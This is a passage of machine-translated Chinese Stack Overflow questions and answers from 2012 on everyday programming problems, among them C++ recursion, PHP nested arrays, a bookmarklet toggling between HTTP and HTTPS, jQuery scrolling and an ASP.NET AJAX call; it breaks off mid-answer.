> 标签：c++, pointers, stdvector, dynamic-memory-allocation

*如果你能建议一个更合适的标题，我会永远欠你的。*

问题：我有一个本质上是递归的函数，它旨在从每个四边形中获取每个孩子并将其返回给原始调用者。问题是我每次运行程序时都会得到以下信息（在我的控制台窗口中）：

```
This application has requested the Runtime to terminate it in an unusual way.
Please contact the application's support team for more information. 
```

我的目标是检索每个孩子作为指针。

这是调用者：

```
std::vector<Quad*> children = root->get_children_recursive(player_pos); 
```

这是函数本身：

```
std::vector<Quad*> Quad::get_children_recursive(glm::vec3 player_pos)  {
    std::vector<Quad*> out_children;

    if (children.size() != 0)  {
        for (int i = 0; i < children.size(); i++)  {
            Quad *child = &children[i];

            std::vector<Quad*> childs_children = child->get_children_recursive(player_pos);

            for (int j = 0; j < childs_children.size() - 1; j++)  {
                Quad *childs_child = childs_children.at(j);

                out_children.emplace_back(childs_child);
            }
        }
    }

    if (this->should_draw(player_pos))  {
        out_children.emplace_back(this);
    }

    return out_children;
} 
```

如果您希望我提供更多代码或任何其他详细信息，我将非常乐意提供。

（每次我尝试使用调试器并且程序到达导致上述错误的行时，我都会收到 BSOD ：O）

**编辑：**

标题：

```
class Quad  {
    public:
...
        std::vector<Quad*> get_children_recursive(glm::vec3 player_pos);
...
    protected:
    private:
...

        std::vector<Quad> children;
...
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:46:55.300

孩子是一个`vector<Quad>`还是`vector<Quad*>`？如果是`vector<Quad*>`，那么这一行是错误的：

```
Quad *child = &children[i]; 
```

因为它将获取指针的地址。然后

```
child->get_children_recursive(player_pos) 
```

很可能会导致您遇到的错误。

要解决这个问题，只需删除`&`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-24T06:09:10.903

```
for (int j = 0; j < childs_children.size() - 1; j++)  { 
```

至

```
for (int j = 0; j < childs_children.size(); j++)  { 
```

# iphone - iPhone ModalViewController 未导航到下一个视图

> ID：12068366
> 
> 赞同：0
> 
> 时间：2012-08-22T07:38:09.963
> 
> 标签：iphone, uinavigationcontroller, uitabbarcontroller, modalviewcontroller

我有一个从 App Delegate 显示的 ModalViewController。ModalViewController 启动良好，并将执行各种操作，例如 [self dismissModalViewControllerAnimated:YES]; 正如预期的那样。

解雇有效，但我无法让 ModalViewController 导航/滑动到下一个视图。我的代码中没有收到任何错误或警告。

```
-(IBAction)signUpButtonTapped {
    // i need to get the control for main navigation controller
    HHHTabAppDelegate *appDelegate = (HHHTabAppDelegate *)[[UIApplication sharedApplication]delegate];
    [appDelegate.navigationController popToRootViewControllerAnimated:NO];
    // create object from app main view to push it
    SignUpViewController *signUpViewController = [[SignUpViewController alloc] initWithNibName:@"SignUpViewController" bundle:nil];
    [appDelegate.navigationController pushViewController:signUpViewController animated:YES];
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T11:34:34.667

基本上，当您第一次打开模态视图时，您需要呈现 a`UINavigationController`而不是 a 。`SignupViewController`代码可能如下所示：

```
ModalViewController *modalViewController = [[ModalViewController alloc] initWithNibName:@"ModalViewController" bundle:nil];
UINavigationController *modalNavController = [[UINavigationController alloc] initWithRootViewController:modalViewController];

[appDelegate.navigationController presentModalViewController:modalNavController animated:YES]; 
```

您的问题是您将推送消息发送到`UINavigationController`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:54:02.907

对于弹出和推送视图控制器，您需要预先设置导航控制器。 [在这里](http://theolternative.wordpress.com/2009/04/27/iphone-dev-tips-navigation-and-tap-bar-controller/)，您可以找到有关如何在没有 xib 或情节提要的情况下创建导航控制器的教程。

# php - 从字符串创建数组后向多维数组添加值

> ID：12068369
> 
> 赞同：0
> 
> 时间：2012-08-22T07:38:23.050
> 
> 标签：php, multidimensional-array

好的，这可能会令人困惑。我正在尝试为自己创建一个配置类，我希望它的用法是这样的：

```
$this->config->add('world', 'hello');
// This will create array('hello' => 'world') 
```

现在我的问题是，如果我想将我的值添加到一个不存在但想使用类似这样的东西创建它的多维数组中：

```
$this->config->add('my value', 'hello => world');
// This should create array('hello' => array('world' => 'my value'))

$this->config->add('my value', 'hello => world => again');
// This should create array('hello' => array('world' => array('again' =>'my value'))) 
```

我无法转换`'hello => world'`为值设置为最后一个数组元素的数组。

这就是我到目前为止所拥有的。

```
 public function add($val, $key = null)
    {
        if (is_null($key))
        {
            $this->_config = $val;

        } else {

            $key = explode('=>', str_replace(' ', '', $key));

            if (count($key) > 1)
            {
                // ?

            } else {

                if (array_key_exists($key[0], $this->_config))
                {
                    $this->_config[$key[0]][] = $val;

                } else {

                    $this->_config[$key[0] = $val;
                }
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:45:24.200

```
public function add($val, $key = null)
{
    $config=array();
    if (is_null($key))
    {
        $this->config = $val;

    } else {
        $key = explode('=>', str_replace(' ', '', $key));
        $current=&$this->config;
        $c=count($key);
        $i=0;
        foreach($key as $k)
        {
            $i++;
            if($i==$c)
            {
                $current[$k]=$val;
            }
            else
            {
                if(!isset($current[$k]) || !is_array($current[$k])) $current[$k]=array();
                $current=&$current[$k];
            }
        }
    }
} 
```

这是一个递归版本，它会更加耗费资源：

```
public function add($val, $key = null)
{
    $this->config=array();
    if (is_null($key))
    {
        $config = $val;
    } else {
        $key = array_reverse(explode('=>', str_replace(' ', '', $key)));
        self::addHelper($val,$key,$config);
    }
}
private static function addHelper(&$val,&$keys,&$current)
{
    $k=array_pop($keys);
    if(count($keys)>0)
    {
        if(!isset($current[$k]) || !is_array($current[$k])) $current[$k]=array();
        addHelper(&$val,$keys,&$current[$k]);
    }
    else $current[$k]=$val;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:01:20.107

你可以试试这个，但它会擦除 $this->_config 中的其他数据

```
... more code
if (count($key) > 1)
{
// ?
    $i = count($key) - 1;
    while($i >= 0) {
        $val = array($key[$i] => $val);
        $i--;
    }

    $this->_config = $val;
}
... more code 
```

# mongodb - 存储为单独对象的 Ember 数据嵌入对象

> ID：12068373
> 
> 赞同：1
> 
> 时间：2012-08-22T07:38:46.680
> 
> 标签：mongodb, ember.js, ember-data

我想知道是否可以定义一个存储到另一个模型中的模型。

我有这种结构：

```
Model Contact
    String name
    Model Address (hasMany)
    Model Phone (hasMany) 
```

在我的后端，地址和电话是 MongoDB 的嵌入文档，包含在“联系人”文档中。

而且，只要它们是嵌入式文档，它们就没有 id。当我在 Emberjs/data 层时，它们很好地加载了嵌入式选项（参见[https://github.com/emberjs/data#one-to-one](https://github.com/emberjs/data#one-to-one)部分的末尾），但存储为单独的对象，这会在更新或保存时引起麻烦...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-23T14:36:13.587

您正在使用 RESTadapter...当您保存时，您想序列化所有嵌入的关系吗？

当您保存或更新您的记录时，将选项哈希传递给 toJSON 方法

```
{associations: true} 
```

看看 ember-data 上的单元测试示例： [https ://github.com/emberjs/data/blob/master/packages/ember-data/tests/unit/to_json_test.js](https://github.com/emberjs/data/blob/master/packages/ember-data/tests/unit/to_json_test.js)

```
deepEqual(record.toJSON({ associations: true }),
        { id: 1, name: "Chad", phone_numbers: [{
            id: 7,
            number: '123'
          },
          {
            id: 8,
            number: '345'
          },
          {
            id: 9,
            number: '789'
          }
        ]},
        "association is updated after editing associations array");
}); 
```

希望这可以帮助..

# wpf - Caliburn Micro - UI 未第二次更新

> ID：12068375
> 
> 赞同：3
> 
> 时间：2012-08-22T07:38:51.077
> 
> 标签：wpf, data-binding, caliburn.micro, caliburn

我正在开发一个使用 Caliburn Micro 的 WPF 项目。我遇到了第二次打开视图时视图中的控件没有更新的问题。第一次数据绑定工作正常。

当我在第二次调用 View 时单步执行 ViewModel 时，我可以看到数据绑定属性正在获取新值并调用 NotifyOfPropertyChange() 但更改未反映在 UI 中。有任何想法吗？我的视图继承`PropertyChangedBase()`

以下是我在视图模型中的属性

```
public string Info
{
    get { return _info; }
    set { _info = value; NotifyOfPropertyChange(() => Info); }
}

public IEnumerable<ComponentInfo> BondableComponents
{
    get { return _bondableComponents; }
    set { _bondableComponents = value; NotifyOfPropertyChange(() => BondableComponents); }
} 
```

和 Xaml

```
<TextBox Name="Info" Grid.Row="0" Grid.Column="0" IsReadOnly="True"/>
<DataGrid ItemsSource="{Binding BondableComponents}"> 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2015-07-31T18:08:58.903

```
BindableCollection<ComponentInfo> Bondable 
```

如果您的新项目出现在更新中，则应使用... --edit-- 在 GitHub 上回答。

# arrays - 从字节数组转换时得到不同的二进制数据

> ID：12068376
> 
> 赞同：0
> 
> 时间：2012-08-22T07:38:50.167
> 
> 标签：arrays, byte, bit

我的字节数组有这些前 8 个值，0 0 12 12 0 0 127 224

但是，当我在转换后读取位数组时，它有，

0000,0000 0000,0000 0011,0000 0011,0000 0000,0000 0000,0000 1111,1110 0000,0111

我不知道为什么 bitarray 有这些值......

有人知道为什么会这样吗？

用于转换的代码是；

```
byte[] bytes = System.IO.File.ReadAllBytes(args[0]);

BitArray bits = new BitArray(bytes); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:43:50.100

所有位都需要从右到左读取才能有意义。

0000,0000 0000,0000 0011,0000 --> 00001100 = 12 0011,0000 0000,0000 0000,0000 1111,1110 --> 01111111 = 127 0000,0111

这就是 BitArray 的工作方式。

[http://msdn.microsoft.com/en-us/library/x1xda43a.aspx](http://msdn.microsoft.com/en-us/library/x1xda43a.aspx)

```
The first byte in the array represents bits 0 through 7,
the second byte represents bits 8 through 15, and so on.
The Least Significant Bit of each byte represents the lowest index value:
"bytes [0] & 1" represents bit 0,
"bytes [0] & 2" represents bit 1,
"bytes [0] & 4" represents bit 2,
and so on. 
```

所以数组中第一个字节的最低有效位是位数组中的位 0，数组中第一个字节的第二个最低有效位是位数组中的位 1。

我不知道他们为什么那样做。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:45:13.517

由于某种原因，位流被反转（作为位的字符串表示）。如果你倒着读，没关系：

*   224是`"1110 0000"`，你有它作为`"0000 0111"`
*   127是`"0111 1111"`，你有它作为`"0111 1111"`

# javascript - 结合 Bookmarklet 在 HTTP 和 HTTPS 之间创建切换？

> ID：12068378
> 
> 赞同：4
> 
> 时间：2012-08-22T07:39:09.727
> 
> 标签：javascript, http, url, https, bookmarklet

通过在这里搜索，我现在有两个书签，它们从/到 HTTP/HTTPS 切换：-

```
javascript:location=location.href.replace(/http:/g,"https:") 
```

和 ...

```
javascript:location=location.href.replace(/https:/g,"http:") 
```

但是，请问有没有办法将它们组合成一个书签，根据当前加载的内容从一个书签切换到另一个书签？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-09-10T19:40:38.817

这个线程有点旧，但我在其他任何地方都没有找到更好的答案。

`javascript:((function(){window.location=location.href.replace(/^http/i,"https").replace(/^http\w{2,}/i,"http");})())`

是完全形成的书签代码，应该可以在任何浏览器中工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T07:57:45.863

```
location.href.replace(/^http/i,"https").replace(/^http\w{2,}/i,"http") 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-10T12:52:13.517

```
if (window.location.protocol == 'http:') window.location.protocol = 'https:'
else window.location.protocol = 'http:' 
```

然后，您需要做的就是将其格式化为书签。享受！

# java - 使用对象声明数组数组

> ID：12068380
> 
> 赞同：0
> 
> 时间：2012-08-22T07:39:10.437
> 
> 标签：java

我正在尝试使用 Objects 构造一个数组数组。我创建了包含多个变量的对象块。我写：

```
Block[][] block = new Block[4][4]; 
```

现在插入时出现错误：

```
block[1][1] = new Block(); // As what I've understood, we still need 
                           // to create the object inside this specific block[][] 
```

错误信息是：

> 找不到符号，需要 ']' 并且方法声明无效，需要返回类型

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T07:46:06.953

这个对我有用

```
public class testProgram {

    public static void main(String args[]) {
        Block[][] block = new Block[4][4];
        block[1][1] = new Block();
        block[1][1].setName("Block 1 1");
        System.out.println(block[1][1].getName());

        block[1][2] = new Block();
        block[1][2].setName("Block 1 2");
        System.out.println(block[1][2].getName());
    }

    public static class Block {

        private String name;

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }
    }
} 
```

# tcp - 为什么禁用网卡后TCP状态仍然建立一段时间

> ID：12068382
> 
> 赞同：0
> 
> 时间：2012-08-22T07:39:23.767
> 
> 标签：tcp, window, winsock

我正在测试一个网络应用程序，我注意到禁用网卡后，当我 netstat -an 时，我仍然可以看到 TCP 状态仍然是建立一段时间。我想知道为什么网卡禁用后TCP状态没有立即关闭？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-26T07:01:45.880

为什么要呢？该链接可能会再次启用，或者可能有另一个路由到对等方，或者另一个路由可能变得可用。在这些情况下，通信可以在 L3 及更高层继续进行而不会出现任何故障。

# batch-file - 是否可以批量制作搜索工具？

> ID：12068384
> 
> 赞同：0
> 
> 时间：2012-08-22T07:39:26.233
> 
> 标签：batch-file, cmd

我想要实现的是一个搜索功能，它允许用户输入一个文件的名称，它会找到该文件并将文件的路径保存为变量，这样我以后就可以使用文件路径了这可能我无法找到有关此的任何信息

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:47:20.833

编写一个批处理文件，如：

```
@echo OFF

for /f %%F in ('dir %2\%1 /s /b') do 
    (
        <nul (set /p msg=%%~nxF )
        for /f %%G in ('dir %3\%%~nxF /s /b') do 
            (
                if exist %%G 
                    (
                        @echo found at %%G
                    ) 
            )
     ) 
```

现在在这里：

`%1`是用户提供的文件名

`%2`是用户提供的首先搜索的目录。

`%3`是用户提供的要搜索的第二个目录。

要将详细信息保存到文本文件中，请使用：

```
FindAll MyFile.txt d:\dir1 d:\dir2 > MyFile_report.txt 2>&1 
```

该`<nul (set /p)`技巧将在没有新行的情况下将文本输出到控制台

# svn - 使用 SVN 的最佳方式

> ID：12068385
> 
> 赞同：2
> 
> 时间：2012-08-22T07:39:34.830
> 
> 标签：svn, tortoisesvn, production-environment

我正在尝试在我的组织中实施 SVN。我们有 2 台服务器：生产和开发。一些程序员有自己的系统副本。

我们现在的工作方式：开发服务器在主干下。一些程序员直接在它上面工作。如果程序员有他自己的副本 - 他在 svn 中有私有分支。

主要问题是生产服务器。在我们的系统中，我们没有发布版本，所以 - svn 中没有标签。我为生产创建了单独的分支 - 主。如果我们需要将一些提交从开发转移到生产 - 我们合并主干和主分支。

也许还有其他方法可以将更改传输和控制到生产服务器？还是使用不同的版本控制系统？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:07:36.740

我不确定你所说的“程序员有自己的副本”是什么意思……如果你使用的是 SVN，他们都必须有一个本地副本才能工作。

无论如何，我建议您阅读[带有 Subversion 的版本控制（SVNBook）](http://svnbook.red-bean.com/en/1.7/index.html)，更具体地说，阅读[基本工作周期](http://svnbook.red-bean.com/en/1.7/svn.tour.cycle.html)并检查[标签](http://svnbook.red-bean.com/en/1.7/svn.branchmerge.tags.htmlAe)的使用方式。每次你想要发布一个“发布”时，它绝对比将你的分支合并到主干上更容易使用，尽管有时你无论如何都必须这样做。

您还可以考虑使用其他 SCM，例如[Git](http://git-scm.com/documentation)、[Mercurial](http://mercurial.selenic.com/guide/)或[Bazaar](http://doc.bazaar.canonical.com/bzr.2.5/en/user-guide/index.html)。我真的很喜欢 Git，但 Bazaar 可能是有史以来设计的最好的 SCM 之一：易于使用且与 Git 一样好。Git 非常好，但可能需要一些时间才能掌握，特别是如果你来自 SVN。

从一个 SCM 切换到另一个 SCM 不是一件容易的事，特别是如果你已经有很多存储库，所以如果你打算这样做，先用一个小的，测试它，尝试从 SVN 保留版本历史（那里如果目的地是 Git，是这些[工具](http://www.kernel.org/pub/software/scm/git/docs/git-svn.html)），然后选择大的。

# android - 在 Android 中将 PC 与 Twitter 的 Internet 时间同步？

> ID：12068389
> 
> 赞同：0
> 
> 时间：2012-08-22T07:39:52.067
> 
> 标签：android, twitter, synchronization

为什么 Twitter 需要让我的电脑与互联网时间同步？我正在尝试在 Android 上实现登录和推文，但我收到了关于同步的奇怪警告。我的电脑是域的一部分，所以我无法更改它的时间。为什么要这样做，我还有哪些其他选择？

PS：我使用 Twitter4j 库：P

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:57:58.313

在没有看到确切的错误消息的情况下，我猜测 Twitter 用于身份验证的证书具有特定的开始和结束日期。如果您的计算机显示日期为 01/01/1970 并且 Twitter 的证书从 09/10/2011 开始 - 您会收到错误消息。

只是猜测 - 发布完整的错误，以便我们了解发生了什么。

# performance - Netty 与 Tornado 的性能？

> ID：12068390
> 
> 赞同：2
> 
> 时间：2012-08-22T07:39:53.813
> 
> 标签：performance, netty, tornado

我尝试在 Netty 下对**WebSocketServer**进行压力测试，并将其与**Tornado**中的 hello demo 进行比较。

两者都接收和响应“hello world html”，我通过**Siege**进行压力测试。它们在完全相同的环境下运行。

我们预计原生 java 应该比 Tornado/Python 更快。然而，结果是：Tornado/Python在 no 方面比 Netty**快大约 2 倍。**每秒处理的请求数。

谁能解释为什么原生 Java 更慢？测试是否正确？

谢谢

**JAVA**：交易速度：657.89 交易/秒 **Python**：交易速度：1435.41 交易/秒

## JAVA WebSocket服务器

```
public class WebSocketServer {

private final int port;

public WebSocketServer(int port) {
    this.port = port;
}

public void run() {
    // Configure the server.
    ServerBootstrap bootstrap = new ServerBootstrap(new NioServerSocketChannelFactory(
            Executors.newCachedThreadPool(), Executors.newCachedThreadPool()));

    // Set up the event pipeline factory.
    bootstrap.setPipelineFactory(new WebSocketServerPipelineFactory());

    // Bind and start to accept incoming connections.
    bootstrap.bind(new InetSocketAddress(port));

    System.out.println("Web socket server started at port " + port + '.');
    System.out.println("Open your browser and navigate to http://localhost:" + port + '/');
}

public static void main(String[] args) {
    int port;
    if (args.length > 0) {
        port = Integer.parseInt(args[0]);
    } else {
        port = 8888;
    }
    new WebSocketServer(port).run();
} 
```

}

## JAVA 消息处理程序

```
@Override
public void messageReceived(ChannelHandlerContext ctx, MessageEvent e) throws Exception {
    Object msg = e.getMessage();
    if (msg instanceof HttpRequest) {
        handleHttpRequest(ctx, (HttpRequest) msg);
    } else if (msg instanceof WebSocketFrame) {
        handleWebSocketFrame(ctx, (WebSocketFrame) msg);
    }
}
private void handleHttpRequest(ChannelHandlerContext ctx, HttpRequest req) throws Exception {
    HttpResponse res = new DefaultHttpResponse(HTTP_1_1, OK);
    // ChannelBuffer content = WebSocketServerIndexPage.getContent(getWebSocketLocation(req));
    ChannelBuffer content = ChannelBuffers.copiedBuffer( "<html><body>hello!</body></html>", CharsetUtil.US_ASCII);

    res.setHeader(CONTENT_TYPE, "text/html; charset=UTF-8");
    setContentLength(res, content.readableBytes());

    res.setContent(content);
    sendHttpResponse(ctx, req, res);
    return;

}

private void handleWebSocketFrame(ChannelHandlerContext ctx, WebSocketFrame frame) {

    // Check for closing frame
    if (frame instanceof CloseWebSocketFrame) {
        handshaker.close(ctx.getChannel(), (CloseWebSocketFrame) frame);
        return;
    } else if (frame instanceof PingWebSocketFrame) {
        ctx.getChannel().write(new PongWebSocketFrame(frame.getBinaryData()));
        return;
    } else if (!(frame instanceof TextWebSocketFrame)) {
        throw new UnsupportedOperationException(String.format("%s frame types not supported", frame.getClass()
                .getName()));
    }

    // Send the uppercase string back.
    String request = ((TextWebSocketFrame) frame).getText();
    if (logger.isDebugEnabled()) {
        logger.debug(String.format("Channel %s received %s", ctx.getChannel().getId(), request));
    }
    ctx.getChannel().write(new TextWebSocketFrame(request.toUpperCase()));
}

private static void sendHttpResponse(ChannelHandlerContext ctx, HttpRequest req, HttpResponse res) {
    // Generate an error page if response status code is not OK (200).
    if (res.getStatus().getCode() != 200) {
        res.setContent(ChannelBuffers.copiedBuffer(res.getStatus().toString(), CharsetUtil.UTF_8));
        setContentLength(res, res.getContent().readableBytes());
    }

    // Send the response and close the connection if necessary.
    ChannelFuture f = ctx.getChannel().write(res);
    if (!isKeepAlive(req) || res.getStatus().getCode() != 200) {
        f.addListener(ChannelFutureListener.CLOSE);
    }
} 
```

## Tornado 下的 Python

```
define("port", default=8888, help="run on the given port", type=int)

class MainHandler(tornado.web.RequestHandler):
def get(self):
    self.write("Hello, world")

def main():
    tornado.options.parse_command_line()
    application = tornado.web.Application([
        (r"/", MainHandler),
    ])
    http_server = tornado.httpserver.HTTPServer(application)
    http_server.listen(options.port)
    tornado.ioloop.IOLoop.instance().start()

if __name__ == "__main__":
    main() 
```

# javascript - 如何在 Radio 组 extjs 中禁用多选

> ID：12068402
> 
> 赞同：8
> 
> 时间：2012-08-22T07:40:26.090
> 
> 标签：javascript, extjs

我在 extjs 的面板中有一个带有 3 个单选按钮的单选组组件。但是我可以一次选择多个rediobuttons，而radiogroups应该只允许选择一个。它应该是默认行为。

我在 radiogroup 组件中找不到任何配置属性来禁止多选。

有没有办法在 extJs 的单选组中禁用多选。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-22T17:53:10.820

配置在收音机下。单选组下的每个单选按钮都应具有**相同的名称**。看看下面的代码。

```
xtype: 'radiogroup'
,fieldLabel: 'Sample radiogroup'
,items: [
    {boxLabel: 'Item 1', name: 'same-name', inputValue: 1}
    ,{boxLabel: 'Item 2', name: 'same-name', inputValue: 2, checked: true}
    ,{boxLabel: 'Item 3', name: 'same-name', inputValue: 3}
    ,{boxLabel: 'Item 4', name: 'same-name', inputValue: 4}
    ,{boxLabel: 'Item 5', name: 'same-name', inputValue: 5}
] 
```

# liferay - 如何获取门户邮件通知地址

> ID：12068403
> 
> 赞同：3
> 
> 时间：2012-08-22T07:40:37.700
> 
> 标签：liferay

我在控制面板/门户设置/电子邮件通知中有它。我需要在我的控制器中以编程方式获取它，但我不知道如何。你能帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T16:48:19.907

在 6.1.x 中，您应该能够使用：

```
PortalUtil.getEmailFromAddress(...) 
```

但在 6.0.x 中，您需要：

```
PrefsPropsUtil.getString(themeDisplay.getCompanyId(),PropsKeys.ADMIN_EMAIL_FROM_ADDRESS); 
```

更多信息：[http ://www.liferay.com/community/forums/-/message_boards/message/11090283](http://www.liferay.com/community/forums/-/message_boards/message/11090283)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T10:58:07.450

你应该试试：

```
themeDisplay().getCompany().getEmailAddress() 
```

# android - 使用Sphinx4.0构建语音识别。安卓应用

> ID：12068404
> 
> 赞同：2
> 
> 时间：2012-08-22T07:40:40.063
> 
> 标签：android, eclipse, forceclose, cmusphinx, sphinx4

我一直在 Eclipse IDE 中使用 Sphinx4 创建一个用于语音识别的 Java 应用程序，效果很好！但现在，我有一个想法，将项目转为在 android 平台上运行。

该代码非常适合 sphinx4 演示语音识别。Android中的程序，但是当我尝试在设备上运行它时它崩溃了！说它“意外停止！” （强制关闭）

从我在互联网上的调查中，我听说 Sphinx 以与 dalvik 不兼容的方式配置麦克风。

那么有什么办法可以让这两件事一起工作吗？就像在 dalvik 设备中配置麦克风并使用 sphinx 来处理输入一样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T19:30:50.127

Sphinx4 不是为移动应用程序设计的。改用pocketsphinx：

[http://cmusphinx.sourceforge.net/2011/05/building-pocketsphinx-on-android/](http://cmusphinx.sourceforge.net/2011/05/building-pocketsphinx-on-android/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T21:54:31.423

对于支持语音的 Android 应用程序，您应该使用[免视。](http://code.google.com/p/eyes-free/)

# javascript - 在这种情况下使用 onclick 事件处理程序是否可以接受？

> ID：12068408
> 
> 赞同：1
> 
> 时间：2012-08-22T07:40:51.600
> 
> 标签：javascript, jquery, javascript-events, event-handling

我有一个带有子菜单的简单导航菜单。当在同一页面上单击子菜单中的链接时，窗口会使用 jQuery 滚动到相应的锚点。

以下是子菜单列表项的示例：

```
<li><a href="page.html#some-anchor" onclick="clickScroll('#some-anchor');"><span>foo</span></a></li> 
```

对应的锚点如下所示：

```
<a class="hidden-anchor" id="some-anchor" name="some-anchor"></a> 
```

JavaScript 函数：

```
function clickScroll(dest) {
    $('html, body').stop().animate({
        scrollTop: $(dest).offset().top
    }, 1000);
} 
```

这一切都很好，但像我之前的许多人一样，我一直在读到内联事件处理程序这些天是不好的做法。

如何修改函数以消除对任何 onclick 调用的需要？请记住，每个子菜单链接对应一个不同的锚点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T07:45:33.700

假设您希望所有带有哈希的锚`#`滚动到具有相同 ID 的相应锚，您可以遍历所有锚，解析出哈希并滚动到相同的 ID：

```
$('a').each(function() {
    if ( this.hash ) {
        $(this).click(function(e) {
            $('html,body').animate({ scrollTop: $(this.hash).offset().top }, 1000);
            e.preventDefault();
        });
     }
}); 
```

[http://jsfiddle.net/nGfW5/](http://jsfiddle.net/nGfW5/)

如果您想将此功能限制为某些锚点，请添加一个类并将其插入选择器 f.ex`$('a.hashlink').each(`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T07:46:24.760

使用事件处理程序： http: [//api.jquery.com/on/](http://api.jquery.com/on/)

```
<li><a id="some-scroll-source" href="page.html#some-anchor"><span>foo</span></a></li>

<a class="hidden-anchor" id="some-anchor" name="some-anchor"></a>

(function () {
    function clickScroll() {
        var dest = $('#' + ($(this).attr('href').split('#')[1]));
        $('html, body').stop().animate({
            scrollTop: $(dest).offset().top
        }, 1000);
    }

    $('#some-scroll-source').on('click', clickScroll);;
}()); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T07:44:32.217

试试这个：

```
$('li a').each (function () {
    $(this).click(function () {
        $('html, body').stop().animate({
           scrollTop: $(this.hash).offset().top
        }, 1000);
    });
}); 
```

# jquery - 为什么 $.ajax 不调用这个 webmethod？

> ID：12068409
> 
> 赞同：0
> 
> 时间：2012-08-22T07:40:58.557
> 
> 标签：jquery, ajax, xmlhttprequest

这是方法

```
 [WebMethod]
   public static string[] GetCustCodeFromCustomerName(string[] custName)
   {
       if (custName.Length == 0)
           return null;
       else
       {
           List<string> items = new List<string>();
           StringBuilder custList = new StringBuilder();
           string custListstr = string.Empty;
           for (int i = 0; i < custName.Length; i++)
               custList.Append(custName.ElementAt(i) + ", ");
           custListstr = custList.ToString().Substring(0, custList.Length - 2);
           try
           {
               SqlCommand cmd = new SqlCommand();
               SqlDataReader sdr;
               DataSet ds;
               cmd.CommandText = "sp_sel_custcodeFromCustName";
               cmd.CommandType = CommandType.StoredProcedure;
               cmd.Parameters.AddWithValue("@customercodeinlist", custListstr);
               cmd.Parameters.AddWithValue("@BranchId", Globals.BranchID);
               cmd.Parameters.AddWithValue("@Flag", 1);
               sdr = AppClass.ExecuteReader(cmd);
               ds = AppClass.GetData(cmd);
               while (sdr.Read())
               {
                   items.Add("" + sdr.GetValue(0));
               }
               sdr.Close();
               sdr.Dispose();
               return items.ToArray();
           }
           catch (Exception)
           {
               return null;
           }
       }
   } 
```

我这样称呼它...

```
custList = $(':checkbox:checked').map(function () { return    $(this).closest('tr').find('.grdCustName').text() }).get();

         $.ajax({
                type: "post",
                url: "~/AutoComplete.asmx/GetCustCodeFromCustomerName",
                data: "{custName:'" + custList + "'}",
                contentType: "application/json; charset=utf-8",
                dataType: "json",
                error: function (XMLHttpRequest, textStatus, errorThrown) {
                    alert(textStatus);
                },
                success: function (result) {
                    alert("success" + result);
                }
            }); 
```

我尝试了各种组合，没有`contentType`and `datatype`，with`get`而不是 post，但到目前为止似乎仍然没有任何效果。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:45:01.597

您必须删除`~`运算符，我*认为*Webservice 代码和 json 参数有问题。

看一下示例（.aspx 和 .asmx 都在 webapp 的根目录下）：

**示例.aspx**

* * *

```
<script type="text/javascript">
    $(function () {
        $("#button1").click(function () {
            /* data parameter - array */
            var param = "{'custName': ['aa','bb','cc']}";

            $.ajax({
                type: "POST",
                url: "SampleWs.asmx/GetList",
                data: param,
                contentType: "application/json; charset=utf-8",
                dataType: "json",
                success: function (data) {
                    console.log(data);
                    alert(data.d);
                },
                error: function (xhr, textStatus, errorThrown) {
                    console.log(textStatus + " : " + errorThrown);
                }
            });
        });
    });
</script> 
```

**SampleWs.cs**

* * *

```
[WebService(Namespace = "http://localhost/jquery/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
[System.Web.Script.Services.ScriptService]
public class SampleWs : System.Web.Services.WebService {
    [WebMethod]
    [ScriptMethod(ResponseFormat=ResponseFormat.Json)]
    public   string[] GetList(string []custName)
    {
        for (int i = 0; i < custName.Length; i++)
            custName[i] = custName[i].ToUpper();
        return custName;  
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:53:01.377

`.get()`在此行的末尾您可以调用不带任何参数的调用：

```
custList = $(':checkbox:checked').map(function () { return    $(this).closest('tr').find('.grdCustName').text() }).get(); 
```

您可以考虑删除它。

同样正如其他人所提到的，您应该`~`从 URL 中删除该字符，因为它仅适用于服务器端代码。

# java - 一个微调器中是否可以有两种不同的字体大小

> ID：12068410
> 
> 赞同：0
> 
> 时间：2012-08-22T07:41:04.610
> 
> 标签：java, android, font-size, android-spinner

我想知道当你有 1 个 Spinner 时是否有可能在其中获得 2 种不同的字体大小。我想在微调器上显示一个缩写，然后在它之后显示完整的单词，但更小。参见图片示例（使用 Photoshop 完成）：

![在此处输入图像描述](../Images/e4d9672280806d4f2f5c5a2679969345.png)

* * *

## 回答 #1

> 赞同：2
> 
